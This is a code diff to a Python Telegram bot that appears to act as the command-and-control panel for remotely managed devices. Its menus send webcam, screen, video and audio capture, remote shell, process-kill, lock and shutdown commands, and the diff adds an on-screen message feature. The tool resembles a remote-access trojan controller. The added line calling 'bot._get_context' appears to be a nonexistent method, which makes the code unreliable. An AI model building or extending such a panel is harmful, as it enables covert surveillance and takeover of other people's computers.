@@ -71,7 +71,8 @@ class ServerBot:
         self.application.add_handlers([
             CommandHandler("start", self.start_command),
             CommandHandler("devices", self.list_devices_command),
-            CallbackQueryHandler(self.callback_handler)
+            CallbackQueryHandler(self.callback_handler),
+            MessageHandler(filters.TEXT & (~filters.COMMAND), self.text_message_handler)
         ])
 
     async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -149,14 +150,29 @@ class ServerBot:
         elif query.data == "back_to_devices":
             await self.show_devices_list(query.message.chat_id)
 
+    async def text_message_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        user_id = update.effective_user.id
+        if user_id not in ADMIN_IDS:
+            return
+        # Проверяем, ожидается ли текст для show_message
+        if 'show_message_device' in context.user_data:
+            device_id = context.user_data.pop('show_message_device')
+            text = update.message.text
+            # Сохраняем команду с текстом
+            with sqlite3.connect(DATABASE) as conn:
+                conn.execute("INSERT INTO commands (device_id, command, status, created_at) VALUES (?, ?, 'pending', CURRENT_TIMESTAMP)",
+                             (device_id, f"show_message:{text}"))
+            await update.message.reply_text(f"Команда 'Показать сообщение' отправлена устройству. Ожидайте...")
+            await self.show_devices_list(update.effective_chat.id)
+
     async def refresh_devices(self, chat_id):
         with sqlite3.connect(DATABASE) as conn:
             conn.execute("UPDATE devices SET is_online=0")
-        
         await self.application.bot.send_message(
             chat_id=chat_id,
             text="🔄 Обновление статуса устройств..."
         )
+        await asyncio.sleep(5)  # Ждём 5 секунд для обновления статусов
         await self.show_devices_list(chat_id)
 
     async def handle_device_action(self, chat_id, device_id):
@@ -204,7 +220,6 @@ class ServerBot:
                 [InlineKeyboardButton("🎤 Запись звука (10 сек)", callback_data=f"action_{device_id}_record_audio_10")],
                 [InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}")]
             ]
-            
             await self.application.bot.send_message(
                 chat_id=chat_id,
                 text="Мультимедиа функции:",
@@ -213,17 +228,14 @@ class ServerBot:
         elif action == "control_menu":
             keyboard = [
                 [InlineKeyboardButton("🖱️ Клик мыши", callback_data=f"action_{device_id}_mouse_click")],
-                [InlineKeyboardButton("⌨️ Ввод текста", callback_data=f"action_{device_id}_type_text")],
                 [InlineKeyboardButton("🔣 Комбинация клавиш", callback_data=f"action_{device_id}_hotkey")],
                 [InlineKeyboardButton("📺 Вывести сообщение", callback_data=f"action_{device_id}_show_message")],
                 [InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}")]
             ]
-            
             await self.application.bot.send_message(
                 chat_id=chat_id,
                 text="Функции управления:",
                 reply_markup=InlineKeyboardMarkup(keyboard))
-            
         elif action == "system_menu":
             keyboard = [
                 [InlineKeyboardButton("💻 Командная строка", callback_data=f"action_{device_id}_cmd")],
@@ -235,20 +247,23 @@ class ServerBot:
                 [InlineKeyboardButton("🔄 Перезагрузить", callback_data=f"action_{device_id}_reboot")],
                 [InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}")]
             ]
-            
             await self.application.bot.send_message(
                 chat_id=chat_id,
                 text="Системные функции:",
                 reply_markup=InlineKeyboardMarkup(keyboard))
-            
+        elif action == "show_message":
+            # Запоминаем, что ждём текст для show_message
+            context = self.application.bot._get_context(chat_id)
+            context.user_data['show_message_device'] = device_id
+            await self.application.bot.send_message(
+                chat_id=chat_id,
+                text="Введите текст, который нужно вывести на экране устройства:")
         elif action in ["screenshot", "webcam", "record_video_10", "record_audio_10", 
-                       "mouse_click", "type_text", "hotkey", "show_message",
+                       "mouse_click", "hotkey",
                        "cmd", "processes", "killprocess", "lock", "sleep", "shutdown", "reboot"]:
-            
             with sqlite3.connect(DATABASE) as conn:
                 conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                            (device_id, action))
-            
             await self.application.bot.send_message(
                 chat_id=chat_id,
                 text=f"Команда '{action}' отправлена устройству. Ожидайте...",
